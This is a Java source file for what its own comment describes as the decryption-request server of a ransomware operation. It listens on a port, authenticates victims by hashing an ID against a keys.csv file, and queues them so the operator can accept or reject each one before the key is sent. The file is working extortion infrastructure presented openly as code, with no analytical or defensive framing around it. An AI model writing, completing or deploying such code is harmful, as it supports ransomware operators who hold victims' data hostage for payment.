/*
   Functionality:
   1. receives decrypt requests from IPs, and store them in a file of IPs
   2. decryption acceptance interface
   3. get the key stored in a json file, send it to the victim.
 */

import java.io.*;
import java.net.*;
import java.util.*;
import java.io.File;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class DecryptRequestHandler {
public static final String ANSI_RESET = "\u001B[0m";
public static final String ANSI_PURPLE = "\u001B[35m";
public static final String DR_HEADER = ANSI_PURPLE + "[DecryptionRequestHandler]: " + ANSI_RESET;
private int port;
private ServerSocket server   = null;
private DataInputStream in       =  null;
private DRListener l;
private boolean running;

public DecryptRequestHandler(int port)
{
        this.port = port;
        startServer();

}

public boolean isRunning() {
        return running;
}

public void startServer() {
        try
        {
                server = new ServerSocket(port);
                l = new DRListener(server);
                l.start();
                running = true;
        }
        catch(IOException i)
        {
                System.out.println(DR_HEADER + "Failed to start the server");
        }
}

public void stopServer() {
        try
        {       System.out.println("Do you want to reject all authenticated requests to stop DecryptionRequestHandler? (y/N)");
                System.out.print("?: ");
                Scanner input = new Scanner(System.in);
                String res = input.nextLine().toUpperCase();
                if (res.equals("Y")) {
                        DRHandler.requests.clear();
                        server.close();
                        System.out.println(DR_HEADER + "Server stopped");
                } else {
                        System.out.println(DR_HEADER + "Canceled operation");
                }
                running = false;}
        catch(IOException i)
        {
                System.out.println(DR_HEADER + "Failed to stop the server");
        }

}


public void command(String cmd) { // receive command from the main server
        switch (cmd) {
        case "help":
                System.out.println("DecryptionRequestHandler commands:\n");
                System.out.println("*tip: all DecryptionRequestHandler commands are ran with the DR: header");
                System.out.println("\tDR:help: show this page");
                System.out.println("\tDR:off: stop DecryptionRequestHandler");
                System.out.println("\tDR:on: turn on DecryptionRequestHandler");
                System.out.println("\tDR:show: show authenticated requests");
                System.out.println("\tDR:reject <idx>: reject a specific request by index");
                System.out.println("\tDR:accept <idx>: accept a specific request by index");
                break;
        case "show": // show all authenticated requests
                System.out.println(DRHandler.requests);
                break;
        case "off":
                stopServer();
                break;
        case "on":
                startServer();
                break;
        case "":
                break;
        }


}

public DRListener getListener() {
        return l;
}

public static void main(String args[])
{
        DecryptRequestHandler server = new DecryptRequestHandler(5555);
}

public void run() {
        DecryptRequestHandler server = new DecryptRequestHandler(5555);
}
}


class DRListener extends Thread {
public static final String ANSI_RESET = "\u001B[0m";
public static final String ANSI_PURPLE = "\u001B[35m";
public static final String DR_HEADER = ANSI_PURPLE + "[DecryptionRequestHandler]: " + ANSI_RESET;
private Socket socket   = null;
private ServerSocket server   = null;
private DataInputStream in       =  null;
private int max_threads = 100;

public DRListener(ServerSocket server) {
        this.server = server;
}
public void run() {
        try
        {
                System.out.println(DR_HEADER + "request handler started");
                System.out.println(DR_HEADER + "Waiting for clients ...");
                while (true) {
                        try {
                                DRHandler.keys = new File("keys.csv");
                                break;
                        } catch (Exception e) {
                                continue;
                        }
                }
                while (true) {
                        if (DRHandler.numOfThreads <= max_threads) {
                                socket = server.accept();

// takes input from the client socket
                                in = new DataInputStream(
                                        new BufferedInputStream(socket.getInputStream()));

                                DRHandler handler = new DRHandler(socket, in);
                                handler.start();

                        }
                }

        }
        catch(Exception e)
        {
                System.out.println(e);
        }
}
}


class DRHandler extends Thread {
public static final String ANSI_RESET = "\u001B[0m";
public static final String ANSI_PURPLE = "\u001B[35m";
public static final String DR_HEADER = ANSI_PURPLE + "[DecryptionRequestHandler]: " + ANSI_RESET;
private Socket socket;
private DataInputStream in;
public static ArrayList<Socket> requests = new ArrayList<Socket>();
public static File keys;
public static int numOfThreads = 0;

public DRHandler(Socket socket, DataInputStream in) {
        this.socket = socket;
        this.in = in;
        numOfThreads++;

}
public boolean authenticate() {
        String id = "";
        String hash = "";
        boolean found = false;
        System.out.println(DR_HEADER + "Start authentication");
        while (!socket.isClosed())
        {

                try
                {
                        MessageDigest md = MessageDigest.getInstance("SHA-256");
                        id = in.readUTF();
                        byte[] data = md.digest(id.getBytes(StandardCharsets.UTF_8));
                        hash = Base64.getEncoder().encodeToString(data);
                        System.out.println(hash);

                        Scanner reader = new Scanner(keys);

                        while (reader.hasNextLine()) {
                                String line = reader.nextLine();
                                String[] rows = line.split(",");
                                if (rows[2].equals(hash)) {
                                        found = true;
                                        requests.add(socket);
                                        System.out.println(DR_HEADER + "Authentication succeeded");
                                        return found;
                                }
                        }
                        if (!found) {
                                System.out.println(DR_HEADER + "Authentication failed");
                                return found;
                        }

                }
                catch (FileNotFoundException e) {
                        System.out.println(DR_HEADER + "No keys.csv created, refusing connection");
                        close();
                        break;
                }
                catch(Exception e)
                {
                        System.out.println(DR_HEADER + "[DecryptionRequestHandler]: " + e);
                        break;
                }
        }
        return found;
}

public void run() {

// authenticate
        boolean auth = authenticate();
        if (auth) {
                try {
                        while (!socket.isClosed())
                        {
                                System.out.println(in.readUTF());
                        }
                } catch (Exception e) {
                        if (requests.indexOf(socket) >= 0) {
                                requests.remove(requests.indexOf(socket));
                        }
                        close();
                }
        } else {
                close();
        }

}

public void close() {
        try
        {
                in.close();
                socket.close();
        }
        catch(IOException i)
        {
                System.out.println(i);
        }
}
}
